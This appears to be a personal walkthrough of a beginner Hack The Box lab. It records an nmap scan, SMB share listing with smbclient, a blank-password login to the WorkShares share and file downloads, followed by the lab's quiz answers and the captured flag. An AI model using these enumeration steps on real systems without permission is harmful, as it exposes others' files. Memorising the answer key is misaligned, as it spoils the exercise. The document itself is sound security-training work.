@@ -1,0 +1,155 @@
+
+PING 10.129.42.59 (10.129.42.59) 56(84) bytes of data.
+64 bytes from 10.129.42.59: icmp_seq=1 ttl=127 time=26.5 ms
+64 bytes from 10.129.42.59: icmp_seq=2 ttl=127 time=24.0 ms
+64 bytes from 10.129.42.59: icmp_seq=3 ttl=127 time=23.3 ms
+64 bytes from 10.129.42.59: icmp_seq=4 ttl=127 time=22.5 ms
+64 bytes from 10.129.42.59: icmp_seq=5 ttl=127 time=25.9 ms
+^C64 bytes from 10.129.42.59: icmp_seq=6 ttl=127 time=23.7 ms
+^C
+--- 10.129.42.59 ping statistics ---
+6 packets transmitted, 6 received, 0% packet loss, time 5016ms
+rtt min/avg/max/mdev = 22.528/24.317/26.533/1.436 ms
+                                                                                                                                                                                              
+┌──(root㉿kali)-[~/hack_the_box/tier0]
+└─# nmap -sV 10.129.42.59 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 01:43 BST
+Nmap scan report for 10.129.42.59
+Host is up (0.046s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
+
+/usr/bin/smbclient -L 10.129.42.59
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	WorkShares      Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.42.59 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+
+└─# /usr/bin/smbclient -L 10.129.42.59             
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	WorkShares      Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.42.59 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                                                                                              
+┌──(root㉿kali)-[~/hack_the_box/tier0]
+└─# /usr/bin/smbclient \\\\10.129.42.59\\WorkShares 
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> help
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+more           mput           newer          notify         open           
+posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
+posix_unlink   posix_whoami   print          prompt         put            
+pwd            q              queue          quit           readlink       
+rd             recurse        reget          rename         reput          
+rm             rmdir          showacls       setea          setmode        
+scopy          stat           symlink        tar            tarmode        
+timeout        translate      unlock         volume         vuid           
+wdel           logon          listconnect    showconnect    tcon           
+tdis           tid            utimes         logoff         ..             
+!              
+smb: \> dir
+  .                                   D        0  Mon Mar 29 09:22:01 2021
+  ..                                  D        0  Mon Mar 29 09:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 10:08:24 2021
+  James.P                             D        0  Thu Jun  3 09:38:03 2021
+
+		5114111 blocks of size 4096. 1748714 blocks available
+smb: \> cd Amy.J
+smb: \Amy.J\> dir
+  .                                   D        0  Mon Mar 29 10:08:24 2021
+  ..                                  D        0  Mon Mar 29 10:08:24 2021
+  worknotes.txt                       A       94  Fri Mar 26 11:00:37 2021
+
+		5114111 blocks of size 4096. 1748714 blocks available
+smb: \Amy.J\> get worknotes.txt 
+getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+smb: \Amy.J\> cd
+Current directory is \Amy.J\
+smb: \Amy.J\> cd ..
+smb: \> cd James.P
+smb: \James.P\> dir
+  .                                   D        0  Thu Jun  3 09:38:03 2021
+  ..                                  D        0  Thu Jun  3 09:38:03 2021
+  flag.txt                            A       32  Mon Mar 29 10:26:57 2021
+
+		5114111 blocks of size 4096. 1748703 blocks available
+smb: \James.P\> get flag.txt
+getting file \James.P\flag.txt of size 32 as flag.txt (0.3 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+smb: \James.P\> 
+
+
+TASK 1
+
+What does the 3-letter acronym SMB stand for?
+
+Server message block
+
+
+TASK 2
+
+What port does SMB use to operate at?
+
+445
+
+
+TASK 3
+
+What is the service name for port 445 that came up in our Nmap scan?
+
+microsoft-ds
+
+
+TASK 4
+
+What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?
+
+-l
+
+
+TASK 5
+
+What is the name of the share we are able to access in the end with a blank password?
+
+workshares
+
+
+TASK 6
+
+What is the command we can use within the SMB shell to download the files we find?
+
+get
+
+
+SUBMIT FLAG
+
+Submit root flag
+5f61c10dffbc77a704d76016a22f1664  
